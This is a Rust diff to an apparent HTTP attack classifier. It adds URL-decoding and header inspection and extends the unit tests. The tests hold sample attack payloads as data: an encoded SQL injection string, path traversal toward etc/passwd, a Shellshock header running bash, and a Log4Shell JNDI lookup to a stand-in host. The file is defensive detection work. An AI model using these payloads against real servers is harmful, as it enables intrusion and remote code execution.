@@ -40,7 +40,54 @@ struct CompiledRule {
     target: Option<Regex>,
     body: Option<Regex>,
     ua: Option<Regex>,
+    header: Option<Regex>,
     path_exact: Option<String>,
+}
+
+/// Percent-decode up to two passes (so `%252e` → `%2e` → `.`) and turn `+`
+/// into a space, so an encoded attack matches the same rules as its plain
+/// form. Invalid escapes and bytes pass through unchanged. Rules are matched
+/// against both the raw and the decoded text, so signatures written against
+/// either form still fire.
+pub(crate) fn normalize(s: &str) -> String {
+    let mut cur = s.to_string();
+    for _ in 0..2 {
+        let next = percent_decode_once(&cur);
+        if next == cur {
+            break;
+        }
+        cur = next;
+    }
+    cur
+}
+
+fn percent_decode_once(s: &str) -> String {
+    let b = s.as_bytes();
+    let mut out: Vec<u8> = Vec::with_capacity(b.len());
+    let mut i = 0;
+    let hex = |c: u8| match c {
+        b'0'..=b'9' => Some(c - b'0'),
+        b'a'..=b'f' => Some(c - b'a' + 10),
+        b'A'..=b'F' => Some(c - b'A' + 10),
+        _ => None,
+    };
+    while i < b.len() {
+        if b[i] == b'%'
+            && i + 2 < b.len()
+            && let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2]))
+        {
+            out.push(h * 16 + l);
+            i += 3;
+            continue;
+        }
+        if b[i] == b'+' {
+            out.push(b' ');
+        } else {
+            out.push(b[i]);
+        }
+        i += 1;
+    }
+    String::from_utf8_lossy(&out).into_owned()
 }
 
 pub struct Classifier {
@@ -63,6 +110,7 @@ impl Classifier {
                     target: r.target_regex.as_deref().map(compile_ci).transpose()?,
                     body: r.body_regex.as_deref().map(compile_ci).transpose()?,
                     ua: r.ua_regex.as_deref().map(compile_ci).transpose()?,
+                    header: r.header_regex.as_deref().map(compile_ci).transpose()?,
                     path_exact: r.path_exact,
                 })
             })
@@ -78,6 +126,7 @@ impl Classifier {
             Some(q) => format!("{}?{}", req.path, q),
             None => req.path.to_string(),
         };
+        let target_dec = normalize(&target);
         let ua = req
             .headers
             .iter()
@@ -86,16 +135,32 @@ impl Classifier {
             .unwrap_or("");
         let body = req
             .body
-            .map(|b| String::from_utf8_lossy(b))
+            .map(|b| String::from_utf8_lossy(b).into_owned())
             .unwrap_or_default();
+        let body_dec = normalize(&body);
+        // Every header as "name: value", for rules that inspect headers other
+        // than User-Agent (Shellshock, Log4Shell, …).
+        let headers_joined = req
+            .headers
+            .iter()
+            .map(|(k, v)| format!("{k}: {v}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let headers_dec = normalize(&headers_joined);
+        let matches_any = |re: &Regex, raw: &str, dec: &str| re.is_match(raw) || re.is_match(dec);
 
         for r in &self.rules {
             let hit = r.path_exact.as_deref() == Some(req.path)
-                || r.target.as_ref().is_some_and(|re| re.is_match(&target))
+                || r.target
+                    .as_ref()
+                    .is_some_and(|re| matches_any(re, &target, &target_dec))
                 || r.body
                     .as_ref()
-                    .is_some_and(|re| !body.is_empty() && re.is_match(&body))
-                || r.ua.as_ref().is_some_and(|re| re.is_match(ua));
+                    .is_some_and(|re| !body.is_empty() && matches_any(re, &body, &body_dec))
+                || r.ua.as_ref().is_some_and(|re| re.is_match(ua))
+                || r.header.as_ref().is_some_and(|re| {
+                    !headers_joined.is_empty() && matches_any(re, &headers_joined, &headers_dec)
+                });
             if hit {
                 labels.push(r.label.clone());
                 weight = weight.max(r.weight);
@@ -246,6 +311,115 @@ mod tests {
         );
         assert!(v.labels.contains(&"sensitive-path".to_string()));
         assert!(v.scan_level >= 2);
+    }
+
+    #[test]
+    fn fully_encoded_sqli_is_decoded_and_caught() {
+        // %27%20OR%201%3D1-- — fully percent-encoded, misses without decoding.
+        let v = classifier().classify(
+            &view(
+                "GET",
+                "/login",
+                Some("id=1%27%20OR%201%3D1--"),
+                "curl/8",
+                None,
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
+    }
+
+    #[test]
+    fn double_encoded_and_backslash_traversal_is_caught() {
+        for q in ["f=..%252f..%252fetc/passwd", "f=..%5c..%5cwin.ini"] {
+            let v = classifier().classify(
+                &view("GET", "/x", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "path-traversal"),
+                "{q}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn log4shell_and_shellshock_in_headers_are_caught() {
+        let shell = RequestView {
+            method: "GET",
+            path: "/",
+            query: None,
+            headers: vec![("user-agent".into(), "() { :;}; /bin/bash -c id".into())],
+            body: None,
+        };
+        assert!(
+            classifier()
+                .classify(&shell, &hist(1, 1), &BotTells::default())
+                .labels
+                .iter()
+                .any(|l| l == "rce")
+        );
+        let jndi = RequestView {
+            method: "GET",
+            path: "/",
+            query: None,
+            headers: vec![("x-api-version".into(), "${jndi:ldap://evil/a}".into())],
+            body: None,
+        };
+        assert!(
+            classifier()
+                .classify(&jndi, &hist(1, 1), &BotTells::default())
+                .labels
+                .iter()
+                .any(|l| l == "rce")
+        );
+    }
+
+    #[test]
+    fn english_apostrophe_body_is_not_sqli() {
+        // "users' and admins" must not be flagged as SQLi.
+        let v = classifier().classify(
+            &view(
+                "POST",
+                "/comment",
+                None,
+                "Mozilla/5.0",
+                Some(b"text=users%27+and+admins+agree"),
+            ),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(!v.labels.iter().any(|l| l == "sqli"), "{:?}", v.labels);
+    }
+
+    #[test]
+    fn well_known_is_not_sensitive() {
+        for p in ["/.well-known/acme-challenge/x", "/.well-known/security.txt"] {
+            let v = classifier().classify(
+                &view("GET", p, None, "Mozilla/5.0", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                !v.labels.iter().any(|l| l == "sensitive-path"),
+                "{p}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn id_substring_is_not_rce() {
+        // ";idx=" must not match the ";id" command-injection signature.
+        let v = classifier().classify(
+            &view("GET", "/p", Some("a=1;idx=2"), "Mozilla/5.0", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(!v.labels.iter().any(|l| l == "rce"), "{:?}", v.labels);
     }
 
     #[test]
